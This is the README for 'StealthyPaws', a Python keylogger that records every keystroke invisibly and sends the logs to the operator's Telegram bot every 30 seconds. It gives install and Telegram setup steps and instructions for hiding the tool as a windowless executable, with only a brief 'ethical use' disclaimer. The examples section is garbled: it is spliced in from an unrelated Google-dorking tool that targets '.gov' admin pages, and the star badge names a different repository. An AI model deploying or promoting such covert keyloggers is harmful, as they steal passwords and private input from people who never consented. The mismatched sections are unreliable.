<h1 align="center">
  <br>
  <a href="https://github.com/ameeshaheshan/StealthyPaws/"><img src="https://github.com/ameeshaheshan/StealthyPaws/blob/main/src/bannernew.png" alt="StealthyPaws"></a>
  <br>
  StealthyPaws 🐾
  <br>
</h1>


<div align="center">

![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Version](https://img.shields.io/badge/version-1.3-blue.svg)

**The Silent Guardian of Your Keystrokes 🐾, Tracking Every Key ⌨️ in the Shadows 🌑, Safely and Securely 🔒**

[Features](#✨-features) • [Installation](#🚀-installation) • [Usage](#💡-usage) • [Examples](#📚-examples) • [Contributing](#🤝-contributing)

</div>
<div align="center">
  <img src="https://github.com/ameeshaheshan/StealthyPaws/blob/main/src/img1.png" alt="StealthyPaws"></a>
  <img src="https://github.com/ameeshaheshan/StealthyPaws/blob/main/src/img2.png" alt="StealthyPaws"></a>
</div>

## 🎯 Overview

StealthyPaws is designed for ethical purposes, offering keylogging functionality in a discreet and user-friendly manner. Once activated, it tracks every key pressed and sends the log file to a Telegram bot, allowing you to monitor inputs remotely. This tool is intended for cybersecurity research, ethical hacking, and educational purposes only.

## ✨ Features

- **🕵️‍♂️ Stealthy Keylogger**: Captures all keystrokes, including space, enter, backspace, etc.
- **🤖 Telegram Integration**: Sends captured keystrokes to your Telegram bot as a log file.
- **🔒 Background Operation**: Runs invisibly and silently, logging all user input.
- **⏱️ Real-time Logging**: Sends log updates every 30 seconds (or on user command).
- **💻 Cross-Platform Support**: Works on Windows, Linux, and macOS systems.
- **⚙️ Customizable Commands**: Supports custom commands for managing the tool.

## 🚀 Installation

```bash
# Clone the repository
git clone https://github.com/ameeshaheshan/StealthyPaws.git

# Navigate to the directory
cd StealthyPaws

# Install requirements
pip install -r requirements.txt
```

## 🤖 How to Set Up the Telegram Bot

### 1. Create a new bot:

* Open the **Telegram app** and search for the “**BotFather**.”
* Start a chat and type `/newbot` to create a new bot.
* Follow the prompts to name your bot and get the bot token (e.g., `123456789:ABCDEF1234567890abcdef1234567890`).

### 2. Get your **Chat ID**:

* Add your bot to a group or use it directly in a private chat.
* Send any message to your bot.
* Open the following URL in your browser (replace BOT_TOKEN with your actual bot token)
  ```bash
  https://api.telegram.org/bot{BOT_TOKEN}/getUpdates
  ```
* Look for "chat": { "id": ... } in the JSON response. This is your chat ID.
  ```bash
  { "ok": true,
    "result": [
    {
      "update_id": 1234567890,
      "message": {
        "message_id": 3,
        "from": {
          "id": 123456789,
          "is_bot": false,
          "first_name": "Stealthy",
          "last_name": "Paws",
          "username": "StealthyPaws",
          "language_code": "en"
        },
        "chat": {
          "id": 123456789,
          "first_name": "Stealthy",
          "last_name": "Paws",
          "username": "StealthyPaws",
          "type": "private"
        },
        "date": 1737962115,
        "text": "Hello"
      }
    }
  }
  ```

### 3. Add the bot credentials to the code:
```bash
BOT_TOKEN = "your-bot-token"
CHAT_ID = "your-chat-id"
```

## 💡 Usage

```bash
# Run script
python app.py
```

## Hide the Keylogger (Optional, for Ethical Use)
Run the script as a background process or convert it to an executable using pyinstaller:

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole app.py
```


### 🔧 Options
Once the program is running, use these commands to interact with StealthyPaws:

```bash
  `show option` – Display the available commands.
  `run` – Start the keylogger and begin logging keystrokes.
  `clear` – Clear the console (except for the banner).
  `update` – Check and update the tool to the latest version.
  `exit` – Exit the tool and stop the keylogger.
```

## 📚 Examples

<b>Example 1: Starting the Keylogger</b>
After starting the tool, type the command run to begin capturing keystrokes:

```bash
  StealthyPaws > run
  [+] Keylogger started. Capturing keys... Press Ctrl+C to stop.
```

<b>Example 2: Sending Logs to Telegram</b>
The tool will automatically send the log file to your Telegram bot every 30 seconds. Here's an example log:

### Domain-Specific Search

```bash
python3 main.py --dork "inurl:admin" --filter ".gov" --pages 5 --save
```

### File Type Filtering

```bash
python3 main.py --dork "confidential" --file-type "pdf" --pages 3 --save
```

## ⚠️ Disclaimer

This tool is for educational and ethical testing purposes only. Users are responsible for complying with applicable laws and obtaining necessary permissions before testing any systems they don't own.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## 🌟 Star History

[![Star History Chart](https://api.star-history.com/svg?repos=ameeshaheshan/NebulaDork&type=Date)](https://star-history.com/#ameeshaheshan/NebulaDork&Date)

---
<div align="center">
Made with ❤️ by Ameesha Heshan
</div>
